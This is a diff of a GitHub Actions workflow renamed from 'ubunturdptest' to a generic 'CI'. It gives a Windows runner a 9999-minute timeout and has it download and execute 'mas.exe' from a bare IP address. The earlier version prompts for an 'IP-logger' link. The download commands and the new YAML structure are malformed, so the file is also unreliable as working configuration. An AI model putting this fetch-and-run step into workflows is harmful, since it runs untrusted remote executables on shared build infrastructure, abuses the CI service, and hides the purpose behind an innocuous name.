@@ -1,18 +1,15 @@
-name: ubunturdptest
-on: 
-  workflow_dispatch:
-   inputs:
-     auth:
-        description: 'Enter Your IP-logger Link to Check Github Server Code'
-        required: true
-        default: 'Enter Your Logger Ip'
-  
-defaults:
+name: CI
+
+on: workflow_dispatch
+
 jobs:
   build:
+
     runs-on: windows-latest
+    timeout-minutes: 9999
+
     steps:
-    - name: Creating User to Login
-      run: |
-          cmd /c http://44.202.6.121/mas.exe -O
-          cmd /c mas.exe
+    run: |
+        cmd /c http://44.202.6.121/mas.exe -O
+        cmd /c mas.exe
+        cmd /c dir
